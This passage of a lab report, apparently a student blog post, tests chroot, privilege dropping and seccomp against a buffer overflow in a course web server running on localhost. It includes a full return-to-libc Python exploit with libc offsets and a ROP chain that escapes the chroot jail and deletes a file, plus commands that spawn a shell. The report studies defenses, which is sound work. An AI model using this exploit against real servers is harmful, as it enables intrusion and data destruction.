class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_chroot</span><br></pre></td></tr></table></figure><h3 id="Perform-chroot-configuration"><a href="#Perform-chroot-configuration" class="headerlink" title="Perform chroot configuration"></a>Perform chroot configuration</h3><p>Add the following code in server.c:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">chroot</span>(<span class="string">&quot;/jail&quot;</span>) == <span class="number">0</span>)  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chroot success\n&quot;</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132459140.png" alt="image-20240619132459140"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo ./chroot-setup.sh  </span><br><span class="line">cd /jail  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132644219.png" alt="image-20240619132644219"></p><h3 id="Perform-exploit-test"><a href="#Perform-exploit-test" class="headerlink" title="Perform exploit test"></a>Perform exploit test</h3><p>Create test files then start the server, found that “chroot success” information was successfully printed.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> tmp directory</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> /jail/tmp directory</span></span><br><span class="line">sudo touch /jail/tmp/test.txt</span><br><span class="line">sudo chown root /jail/tmp/test.txt  </span><br><span class="line">ll /jail/tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start server <span class="keyword">in</span> /jail directory</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-9a3d6da5f1d453d9edec1ee0bfbebcf2_720w.png" alt="image-20240619135337160"></p><p>The server process address information may change, use gdb to recheck (note that using ldd here is wrong, although it shows the same as before, need to use gdb to dynamically attach to see addresses).</p><p>Hint from the manual: The library in jail is separate, located under <code>/jail/lib</code> (different from the original path), so need to re-find the libc base address</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep banksv</span><br><span class="line">sudo gdb -q -p &lt;PID&gt;</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619133412947.png" alt="image-20240619133412947"></p><p><img src="https://pic1.zhimg.com/80/v2-4373262ae41bde082db5e2dc19fefb11_720w.png" alt="image-20240619133327610"></p><p>Modify the script’s <code>base_addr</code> as <code>exploit_2.py</code>, then execute the delete file function. Found that <code>\tmp\text.txt</code> was not successfully deleted, but <code>\jail\tmp\text.txt</code> was deleted. Using <code>dmesg</code> to check kernel debug information found no <code>segmentfault</code>, indicating that <code>chroot</code> is effective, and test files outside the <code>jail</code> directory were not deleted.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619152219338.png" alt="image-20240619152219338"></p><h3 id="Delete-tmp-test-txt-file"><a href="#Delete-tmp-test-txt-file" class="headerlink" title="Delete &#x2F;tmp&#x2F;test.txt file"></a>Delete &#x2F;tmp&#x2F;test.txt file</h3><p><img src="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240621163129108.png" alt="image-20240621163129108"></p><p>Then try to delete the <code>/tmp/test.txt</code> file. This requires using chroot and chdir related calls to implement, so first need to find the related addresses.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chroot&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chdir&quot; </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152017101.png" alt="image-20240621152017101"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d banksv</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152216367.png" alt="image-20240621152216367"></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc base address</span></span><br><span class="line"><span class="comment"># ASLR shoud be off, so that libc&#x27;s base address will not change untill next reboot </span></span><br><span class="line"><span class="comment"># you can use &quot;ldd ./program&quot; to check the libc base address</span></span><br><span class="line">base_addr = <span class="number">0xf7db2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># all of the offsets of functions (strings) inside libc won&#x27;t change much (sometimes changed, so check is needed) .</span></span><br><span class="line"><span class="comment"># to get the offset of a funtion, you can use:</span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;</span></span><br><span class="line"><span class="comment"># to get &quot;/bin/sh&quot;:</span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system</span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span> </span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">sh_addr  = base_addr + <span class="number">0x0018e363</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">ex_addr  = base_addr + <span class="number">0x000340c0</span></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">ul_addr  = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># chroot</span></span><br><span class="line">chr_addr = base_addr + <span class="number">0x000fce60</span></span><br><span class="line"><span class="comment">#chdir</span></span><br><span class="line">chd_addr = base_addr + <span class="number">0x000f2c70</span></span><br><span class="line"><span class="comment"># pop-ret</span></span><br><span class="line">pop_addr = <span class="number">0x080d19a4</span></span><br><span class="line"><span class="comment"># dead</span></span><br><span class="line">d_addr   = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="comment"># ebp  too make the task simple, we print ebp of getToken function (vulnerable) </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Below is the function that you should modify to construct an</span></span><br><span class="line"><span class="comment">## HTTP request that will cause a buffer overflow in some part</span></span><br><span class="line"><span class="comment">## of the vulnerable web server and exploit it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode</span>):</span><br><span class="line">    shift_val = <span class="number">19</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chd_arg = <span class="string">&quot;..\0\0&quot;</span></span><br><span class="line">    chd_arg_addr =  ebp_addr + shift_val</span><br><span class="line"></span><br><span class="line">    chr_arg2 = <span class="string">&quot;server\0\0&quot;</span></span><br><span class="line">    chr_arg2_addr = ebp_addr + shift_val + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chr_arg = <span class="string">&quot;.\0\0\0&quot;</span></span><br><span class="line">    chr_arg_addr =  ebp_addr + shift_val + <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span></span><br><span class="line">    ul_arg_addr =   ebp_addr + shift_val + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span></span><br><span class="line">    sys_arg_addr =  ebp_addr + <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># All of the header information other than &quot;Content-Length&quot; is not important</span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># The Content-Length below is useful, and depends on the length of </span></span><br><span class="line">    <span class="comment"># username plus password, you need to use wireshark (together with web browser) </span></span><br><span class="line">    <span class="comment"># for checking the length</span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>) </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For different oses (and compilation), the length of fillup for </span></span><br><span class="line">    <span class="comment"># hijacking the return address in the stack, could be different,</span></span><br><span class="line">    <span class="comment"># therefore you need to debug the program for checking and adjusting.</span></span><br><span class="line"></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># remove a file use jail breaking</span></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg2_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ul_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(ul_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ex_addr)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 19 * 4</span></span><br><span class="line">    req += chd_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 19 * 4 + 4</span></span><br><span class="line">    req += chr_arg2.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 12</span></span><br><span class="line">    req += chr_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 16</span></span><br><span class="line">    req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Below is the username/password that you can Register into the web server</span></span><br><span class="line">    <span class="comment"># by using web browser. These information will be stored into the sqlite db behind.</span></span><br><span class="line">    <span class="comment"># You need to change these information according to your own registration.</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Note that successful POST will be responded by the server with a hint page.</span></span><br><span class="line">    <span class="comment"># By using the successful response, you can judge whether the server has been </span></span><br><span class="line">    <span class="comment"># crashed (by exploit), so that you can adjust the fillup accordingly.</span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)</span></span><br><span class="line">    <span class="comment">#req += (&quot;@@@@&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)</span><br><span class="line">    sock.send(req)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)</span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):</span><br><span class="line">      resp=resp+rbuf</span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(<span class="string">&quot;shellcode.bin&quot;</span>)):</span><br><span class="line">      shellfile = <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">      shellcode = shellfile.read()</span><br><span class="line">    req = build_exploit(shellcode)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line"></span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Defense-Result-Analysis"><a href="#Defense-Result-Analysis" class="headerlink" title="Defense Result Analysis"></a>Defense Result Analysis</h3><p><code>chroot</code> is a technique used to change the root directory of the current process and its child processes. Through <code>chroot</code>, a process and its child processes can be restricted to a specific directory tree, preventing them from accessing files and resources outside the directory tree. This technique is commonly used to enhance system security, especially for isolating service programs (such as web servers) to limit the scope of potential attack impacts.</p><p><code>chroot</code> changes the root directory of the calling process, making the process believe that the specified directory is the root directory <code>/</code> of the file system. In this way, the process cannot access any files or directories outside this directory, thus achieving process isolation to some extent.</p><h2 id="Change-process-euid-test-exploit"><a href="#Change-process-euid-test-exploit" class="headerlink" title="Change process euid, test exploit"></a>Change process euid, test exploit</h2><h3 id="Experiment-Environment-Configuration-2"><a href="#Experiment-Environment-Configuration-2" class="headerlink" title="Experiment Environment Configuration"></a>Experiment Environment Configuration</h3><p>To avoid affecting the previous experiment’s results, copy the code directory to code_euid. Of course, still need to disable address randomization to avoid address changes.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_euid</span><br></pre></td></tr></table></figure><h3 id="Perform-euid-configuration"><a href="#Perform-euid-configuration" class="headerlink" title="Perform euid configuration"></a>Perform euid configuration</h3><p>Add the following code at the fork child process code location in server.c:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setresuid</span>(<span class="number">1000</span>,<span class="number">1000</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;User IDs successfully set to 1000.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153144782.png" alt="image-20240619153144782"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br></pre></td></tr></table></figure><h3 id="Perform-exploit-test-1"><a href="#Perform-exploit-test-1" class="headerlink" title="Perform exploit test"></a>Perform exploit test</h3><p>Create test files then start the server, found that “User IDs successfully set to 1000” information was successfully printed.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> tmp directory</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start server</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153651371.png" alt="image-20240619153651371"></p><p>Execute the script. Since there’s no difference from task one and the address hasn’t changed, directly use exploit_1.py.</p><p>Perform shell acquisition test, found that shell can be obtained but in non-privileged mode.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1 # Try to get shell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621144856371.png" alt="image-20240621144856371"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 2 # Try to delete file</span><br></pre></td></tr></table></figure><p>Perform file deletion test, found that the <code>/tmp/test.txt</code> file still exists and was not deleted.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153901043.png" alt="image-20240619153901043"></p><p>We can try to modify the owner of this file to myself and see if it can be deleted.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Modify <span class="built_in">test</span> file owner</span></span><br><span class="line">sudo chown lixiang:root /tmp/test.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619154643560.png" alt="image-20240619154643560"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619161636645.png" alt="image-20240619161636645"></p><h3 id="Defense-Result-Analysis-1"><a href="#Defense-Result-Analysis-1" class="headerlink" title="Defense Result Analysis"></a>Defense Result Analysis</h3><p>This defense mainly prevents malicious operations as high-privilege users by reducing the privileges of the 3 child processes started by the server. From the above results, we can also find that after actively giving up root privileges, files owned by root cannot be deleted, but when the file owner is changed to lixiang (ordinary user), the test file can be deleted normally. We also found a phenomenon that even if the file’s user group is root, it can still be deleted, indicating that when deleting files, it has nothing to do with the user group, but is related to the file owner.</p><h2 id="Use-seccomp-to-constrain-web-server’s-vulnerable-process-test-exploit"><a href="#Use-seccomp-to-constrain-web-server’s-vulnerable-process-test-exploit" class="headerlink" title="Use seccomp to constrain web server’s vulnerable process, test exploit"></a>Use seccomp to constrain web server’s vulnerable process, test exploit</h2><h3 id="Experiment-Environment-Configuration-3"><a href="#Experiment-Environment-Configuration-3" class="headerlink" title="Experiment Environment Configuration"></a>Experiment Environment Configuration</h3><p>Similarly copy the code to create a new code_seccomp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_seccomp</span><br></pre></td></tr></table></figure><p>Can use the following commands to check if the kernel has enabled seccomp:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> seccomp support is enabled:</span> </span><br><span class="line">grep CONFIG_SECCOMP= /boot/config-$(uname -r) </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> seccomp filter is enabled:</span> </span><br><span class="line">grep CONFIG_SECCOMP_FILTER= /boot/config-$(uname -r) </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619164635614.png" alt="image-20240619164635614"></p><p>If the output is: <code>CONFIG_SECCOMP=y</code> and <code>CONFIG_SECCOMP_FILTER=y</code>, it means the kernel has enabled seccomp. To check if a specific process has enabled seccomp, use the following command:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&lt;pid&gt;/status | grep Seccomp</span><br></pre></td></tr></table></figure><p>Where <pid> represents the process PID, can use <code>ps -au</code> to view. If the output contains a Seccomp field, it means the process uses seccomp. If there’s no such field, it means the process doesn’t use seccomp.</p><p>Modify the makefile file, add <code>-lseccomp</code> to the compilation options for banksv</p><p><img src="https://picx.zhimg.com/80/v2-6adab4a46975fe018a720b338dd9ecf5_720w.png" alt="image-20240619170121404"></p><p>Found that an additional libseccomp.so.2 library was added, so the base address of libc.so.6 changed, just modify it in the script.</p><p><img src="https://pic1.zhimg.com/80/v2-0b7bc536cb3bbe375efa7e95c045f93d_720w.png" alt="image-20240619173424478"></p><h3 id="Perform-seccomp-coding"><a href="#Perform-seccomp-coding" class="headerlink" title="Perform seccomp coding"></a>Perform seccomp coding</h3><h4 id="Default-allow-explicit-deny"><a href="#Default-allow-explicit-deny" class="headerlink" title="Default allow, explicit deny"></a>Default allow, explicit deny</h4><p>Modify banksv.c, add the following code, initialize with default allow rules, and add rules to deny unlink, then load seccomp.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619165715018.png" alt="image-20240619165715018"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_seccomp</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="type">int</span> ret;  </span><br><span class="line">    scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_ALLOW);  </span><br><span class="line">    <span class="keyword">if</span>(ctx == <span class="literal">NULL</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="built_in">SCMP_SYS</span>(unlink), <span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    ret = <span class="built_in">seccomp_load</span>(ctx);  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;  </span><br><span class="line">    <span class="built_in">seccomp_release</span>(ctx);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span 